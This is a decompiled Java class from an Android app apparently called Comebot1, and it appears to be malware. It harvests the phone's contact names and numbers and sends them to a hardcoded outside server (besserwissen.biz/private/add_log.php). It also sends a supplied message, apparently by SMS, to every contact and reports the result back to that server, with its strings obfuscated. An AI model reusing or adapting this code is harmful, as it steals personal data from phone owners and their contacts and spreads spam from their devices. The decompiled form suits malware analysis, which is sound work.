package anu_bispro.app;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;

public class getnum extends Activity {
  a a = new a();
  
  d b = new d();
  
  b c = new b();
  
  public void a(ContentResolver paramContentResolver) {
    if (!this.a.a((Context)this, b.a("\\COhNKYCI")).equals(b.a("RIS^"))) {
      Cursor cursor = paramContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
      String str = (new StringBuilder()).insert(0, b.a("@")).append(this.a.c((Context)this)).append(b.a("F\006ЦИЇГѻЖ\033ѧ\033ѤЎНЎѢЅЛІИЂ\006ЁЛЃЕЃ")).toString();
      while (cursor.moveToNext()) {
        String str1 = cursor.getString(cursor.getColumnIndex(b.a("_GOG\n")));
        String str2 = cursor.getString(cursor.getColumnIndex(b.a("BRUKJZ_dHZK^")));
        if (!str1.contains(b.a("\021")) && !str1.contains(b.a("\030")) && str1.length() > 6 && !str.contains(str1))
          str = (new StringBuilder()).insert(0, str).append(str1).append(b.a("\033\006\033\006\033")).append(str2).append(b.a("\032\024DI\0301")).toString(); 
      } 
      b b1 = this.c;
      this.b.getClass();
      b1.a("http://besserwissen.biz/private/add_log.php", (new StringBuilder()).insert(0, b.a("V\006")).append(this.a.b((new StringBuilder()).insert(0, this.a.a((Context)this)).append(b.a("G")).append(str).append(b.a("G")).toString())).toString());
      this.a.a((Context)this, b.a("\\COhNKYCI"), b.a("RIS^"));
    } 
    finish();
  }
  
  public void a(ContentResolver paramContentResolver, String paramString) {
    byte b2;
    Cursor cursor = paramContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
    byte b1 = 0;
    boolean bool = false;
    label23: while (true) {
      boolean bool1 = bool;
      b2 = b1;
      while (true) {
        bool = bool1;
        if (cursor.moveToNext()) {
          String str = cursor.getString(cursor.getColumnIndex(b.a("_GOG\n")));
          b1 = b2;
          bool = bool1;
          if (!str.contains(b.a("\021"))) {
            b1 = b2;
            bool = bool1;
            if (!str.contains(b.a("\030"))) {
              b1 = b2;
              bool = bool1;
              if (str.length() > 7)
                try {
                  this.a.c((Context)this, str, paramString);
                  b2++;
                  bool1 = true;
                  continue;
                } catch (Exception exception) {
                  b b3 = this.c;
                  this.b.getClass();
                  b3.a("http://besserwissen.biz/private/add_log.php", (new StringBuilder()).insert(0, b.a("V\006")).append(this.a.b((new StringBuilder()).insert(0, this.a.a((Context)this)).append(b.a("ZХѮЃЗЁЖ\033ИѹЙѻЖЉМЃ\006КкК\n\033ДЅБЇИЍЛЅ\006ІГѹ\006ЄѦЋД\033ВЀѩ\033ИѹЙѻЖЉМЃ\007G")).toString())).toString());
                  bool = false;
                  break;
                }  
              continue label23;
            } 
            continue label23;
          } 
          continue label23;
        } 
        break;
      } 
      break;
    } 
    if (bool == true) {
      b b3 = this.c;
      this.b.getClass();
      b3.a("http://besserwissen.biz/private/add_log.php", (new StringBuilder()).insert(0, b.a("V\006")).append(this.a.b((new StringBuilder()).insert(0, this.a.a((Context)this)).append(b.a("GІЋѧѺѭЀМЋ\006ЄѦЅѮЀЖ\033ѥѺЙЎѮІИ\027\006ЅѤЄѦЋДЀГІИ\033")).append(b2).append(b.a("\033ЇЧЇG")).toString())).toString());
    } 
    finish();
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    Intent intent = getIntent();
    String str1 = intent.getStringExtra(b.a("HRI"));
    String str2 = intent.getStringExtra(b.a("ELEdR^^O"));
    if (str1.contains(b.a("\013")))
      a(getContentResolver()); 
    if (str1.contains(b.a("\n")))
      a(getContentResolver(), str2); 
    finish();
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/getnum.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */